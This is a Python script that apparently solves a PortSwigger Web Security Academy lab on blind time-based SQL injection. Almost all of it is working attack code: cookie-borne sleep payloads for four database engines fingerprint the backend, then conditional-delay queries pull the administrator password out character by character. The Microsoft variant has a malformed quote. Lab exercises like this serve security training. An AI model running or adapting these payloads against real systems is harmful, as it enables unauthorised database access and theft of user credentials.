# PortSwigger
# Lab: Blind SQL injection with time delays and information retrieval

import sys
import requests
import urllib
import urllib3
from enum import Enum

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target Data
url = "https://0aa900ff04ce5ba3832c00430036007a.web-security-academy.net/"
tracking_id = "CpBdngRbN7DohfGw"
session = "1WsNM85StybN9qxDV0qwuI5K3qvoWR3Q"

# Localhost Proxies (To intercept with Burp Suite)
proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

# Request Cookies
cookies = {
    "TrackingId": tracking_id,
    "session": session
}

# Password Characters
characters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']

# Enum of databases
class database(Enum):
    Null = 0
    Oracle = 1
    Microsoft = 2
    PostgreSQL = 3
    MySQL = 4


class database_queries:
    def delay(bbdd: database, time_delay: int):
        query = ""
        match bbdd.name:
            case "Oracle":
                query = "dbms_pipe.receive_message(('a'),%s)"
            case "Microsoft":
                query = "WAITFOR DELAY '0:0:%s'"
            case "PostgreSQL":
                query = "SELECT pg_sleep(%s)"
            case "MySQL":
                query = "SELECT SLEEP(%s)"
        
        return query % (time_delay)
    
    def conditional_delay(bbdd: database, condition: str, time_delay: int):
        query = ""
        match bbdd.name:
            case "Oracle":
                query = "SELECT CASE WHEN %s THEN dbms_pipe.receive_message(('a'),%s) ELSE NULL END FROM users WHERE username='administrator'"
            case "Microsoft":
                query = "SELECT CASE WHEN %s THEN WAITFOR DELAY '0:0:%s ELSE NULL END FROM users WHERE username='administrator'"
            case "PostgreSQL":
                query = "SELECT CASE WHEN %s THEN pg_sleep(%s) ELSE NULL END FROM users WHERE username='administrator'"
            case "MySQL":
                query = "SELECT IF(%s,SLEEP(%s),'a') FROM users WHERE username='administrator'"
        
        return query % (condition, time_delay)

    def function_length(bbdd: database):
        return 'LENGTH' if bbdd.value != 2 else 'LEN'
    
    def function_substring(bbdd: database):
        return 'SUBSTRING' if bbdd.value != 1 else 'SUBSTR'


def get_database_type(time_delay: int):
    bbdd_type = database(0)

    print("(+) Checking if the database is vulnerable to SQLi...")

    for i in range(1, 5):
        playload = database_queries.delay(database(i), time_delay)
        cookies["TrackingId"] = tracking_id + urllib.parse.quote("'; %s --" % playload)
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

        if response.elapsed.total_seconds() >= time_delay:        
            bbdd_type = database(i)
            break

    if bbdd_type.value != 0:
        print("(+) Database: %s" % bbdd_type.name)
    else:
        sys.exit("(!) The database has not been detected.")

    return bbdd_type


def get_password_length(bbdd: database, max_length: int, time_delay: int):
    
    print("(+) Retrieving password length...")
        
    function_length = database_queries.function_length(bbdd)
    conditional_delay = database_queries.conditional_delay(bbdd, f'{function_length}(password)=%s', time_delay)

    for i in range(1, max_length + 1):
        sys.stdout.write("\r" + str(i))
        sys.stdout.flush()

        playload = conditional_delay % (i)
        cookies["TrackingId"] = tracking_id + urllib.parse.quote("'; %s --" % playload)
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

        if response.elapsed.total_seconds() >= time_delay:      
            sys.stdout.write("\r(+) Passowrd length: %i" % i)  
            return i
    else:
        sys.exit("\r(!) The password length has not been detected.")


def get_password(bbdd: database, password_length: int, time_delay: int):    
    
    print("\r(+) Retrieving password characters...")    
    password_extracted = ""

    function_substring = database_queries.function_substring(bbdd)
    conditional_delay = database_queries.conditional_delay(bbdd, f"{function_substring}(password,%i,1)='%s'", time_delay)

    for i in range(1, password_length + 1): 

        for j in range(0, len(characters)):
            sys.stdout.write("\r" + password_extracted + characters[j])
            sys.stdout.flush()

            playload = conditional_delay % (i, characters[j])
            cookies["TrackingId"] = tracking_id + urllib.parse.quote("'; %s --" % playload)
            response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

            if response.elapsed.total_seconds() > time_delay:
                password_extracted += characters[j]
                break

    sys.stdout.write("\r(+) Passowrd: %s" % password_extracted) 


def main():
    time_delay = 5
    max_password_length = 25
    
    bbdd_type = database(3) # get_database_type(time_delay)
    password_length = get_password_length(bbdd_type, max_password_length, time_delay)
    get_password(bbdd_type, password_length, time_delay)


if __name__ == "__main__":     
    main()